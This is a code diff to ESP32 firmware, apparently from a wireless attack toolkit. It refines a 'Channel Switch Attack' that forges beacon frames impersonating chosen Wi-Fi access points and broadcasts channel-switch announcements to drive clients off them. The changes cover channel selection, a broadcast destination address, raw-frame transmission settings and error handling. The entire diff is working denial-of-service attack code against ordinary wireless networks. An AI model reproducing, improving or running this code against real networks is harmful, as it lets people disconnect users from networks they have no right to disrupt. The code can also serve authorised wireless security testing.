@@ -4,6 +4,7 @@
 #include "managers/rgb_manager.h"
 #include "managers/status_display_manager.h"
 #include "scans/wifi/ap_scan.h"
+#include "scans/wifi/wifi_channels.h"
 #include "core/glog.h"
 #include "core/system_manager.h"
 #include "esp_wifi.h"
@@ -23,15 +24,23 @@ static TaskHandle_t csa_task_handle = NULL;
 static volatile bool csa_stop_requested = false;
 
 static uint8_t get_different_channel(int ap_channel) {
-    uint8_t new_channel;
-    do {
-#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
-        new_channel = 1 + (esp_random() % 13);
-#else
-        new_channel = 1 + (esp_random() % MAX_WIFI_CHANNEL);
-#endif
-    } while (new_channel == ap_channel);
-    return new_channel;
+    uint8_t channels[WIFI_CHANNELS_MAX] = {0};
+    uint8_t count = wifi_channels_build_country_list(channels,
+                                                       sizeof(channels));
+    uint8_t candidates[WIFI_CHANNELS_MAX];
+    uint8_t candidate_count = 0;
+    bool ap_is_5ghz = wifi_channels_is_5ghz((uint8_t)ap_channel);
+
+    for (uint8_t i = 0; i < count; i++) {
+        if (wifi_channels_is_5ghz(channels[i]) != ap_is_5ghz ||
+            channels[i] == ap_channel ||
+            !wifi_channels_is_tx_channel(channels[i])) {
+            continue;
+        }
+        candidates[candidate_count++] = channels[i];
+    }
+    if (candidate_count == 0) return 0;
+    return candidates[esp_random() % candidate_count];
 }
 
 static void build_csa_beacon(uint8_t *beacon, size_t *beacon_len, 
@@ -41,7 +50,7 @@ static void build_csa_beacon(uint8_t *beacon, size_t *beacon_len,
     
     *ptr++ = 0x80; *ptr++ = 0x00;
     *ptr++ = 0x00; *ptr++ = 0x00;
-    memcpy(ptr, bssid, 6); ptr += 6;
+    memset(ptr, 0xFF, 6); ptr += 6;
     memcpy(ptr, bssid, 6); ptr += 6;
     memcpy(ptr, bssid, 6); ptr += 6;
     *ptr++ = seq_num & 0xFF;
@@ -102,14 +111,24 @@ static void csa_attack_task(void *param) {
     while (!csa_stop_requested) {
         for (int i = 0; i < selected_ap_count && !csa_stop_requested; i++) {
             int ap_channel = selected_aps[i].primary;
-            if (ap_channel < 1 || ap_channel > MAX_WIFI_CHANNEL) {
-                ap_channel = 1;
+            if (!wifi_channels_is_tx_channel((uint8_t)ap_channel)) {
+                glog("CSA: skipping unsupported AP channel %d\n", ap_channel);
+                continue;
             }
-            
+
             uint8_t new_channel = get_different_channel(ap_channel);
-            
+            if (new_channel == 0) {
+                glog("CSA: no legal same-band channel for AP channel %d\n", ap_channel);
+                continue;
+            }
+
             wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
-            esp_wifi_set_channel(new_channel, second);
+            esp_err_t channel_err = esp_wifi_set_channel((uint8_t)ap_channel, second);
+            if (channel_err != ESP_OK) {
+                glog("CSA: failed to set AP channel %d: %s\n",
+                     ap_channel, esp_err_to_name(channel_err));
+                continue;
+            }
             vTaskDelay(pdMS_TO_TICKS(1));
             
             uint8_t ssid_len = strnlen((char *)selected_aps[i].ssid, 32);
@@ -120,10 +139,16 @@ static void csa_attack_task(void *param) {
                                 selected_aps[i].ssid, ssid_len,
                                 ap_channel, new_channel, seq_num++);
                 
-                esp_wifi_80211_tx(WIFI_IF_AP, beacon_buf, beacon_len, false);
+                esp_wifi_80211_tx(ap_manager_get_tx_iface(), beacon_buf, beacon_len, false);
                 csa_packets_sent++;
                 
                 vTaskDelay(pdMS_TO_TICKS(2));
+            }
+            
+            channel_err = esp_wifi_set_channel(new_channel, second);
+            if (channel_err != ESP_OK) {
+                glog("CSA: failed to set new channel %u: %s\n",
+                     (unsigned)new_channel, esp_err_to_name(channel_err));
             }
         }
         
@@ -138,7 +163,7 @@ static void csa_attack_task(void *param) {
     }
     
     csa_task_handle = NULL;
-    vTaskDelete(NULL);
+    vTaskDeleteWithCaps(NULL);
 }
 
 void channel_switch_attack_start(void) {
@@ -161,19 +186,9 @@ void channel_switch_attack_start(void) {
     esp_wifi_stop();
     vTaskDelay(pdMS_TO_TICKS(50));
 
-#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-    wifi_protocols_t p = {
-        .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR,
-        .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
-    };
-    esp_wifi_set_protocols(WIFI_IF_AP, &p);
-    ESP_ERROR_CHECK(esp_wifi_start());
-#else
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-    ESP_ERROR_CHECK(esp_wifi_start());
-    (void)esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
-#endif
+    // Attack radio profile: STA-only mode (GhostNet AP off, clients kicked)
+    // + wide/LR protocols for unrestricted channel hopping and raw TX
+    ESP_ERROR_CHECK(ap_manager_apply_attack_radio());
 
     glog("Starting Channel Switch Attack on %d AP(s)...\n", selected_ap_count);
     status_display_show_status("CSA Attack Start");
@@ -187,7 +202,7 @@ void channel_switch_attack_start(void) {
         status_display_show_status("CSA Start Fail");
         csa_task_handle = NULL;
         csa_stop_requested = false;
-        ap_manager_start_services();
+        (void)ap_manager_restore_after_attack("csa start");
         return;
     }
     rgb_manager_set_color(&rgb_manager, -1, 255, 0, 0, false);
@@ -207,14 +222,14 @@ void channel_switch_attack_stop(void) {
         }
         
         if (csa_task_handle != NULL) {
-            vTaskDelete(csa_task_handle);
+            vTaskDeleteWithCaps(csa_task_handle);
             csa_task_handle = NULL;
         }
         
         csa_stop_requested = false;
         rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
         esp_wifi_stop();
-        ap_manager_start_services();
+        (void)ap_manager_restore_after_attack("csa stop");
         status_display_show_status("CSA Stopped");
     } else {
         status_display_show_status("No CSA Active");
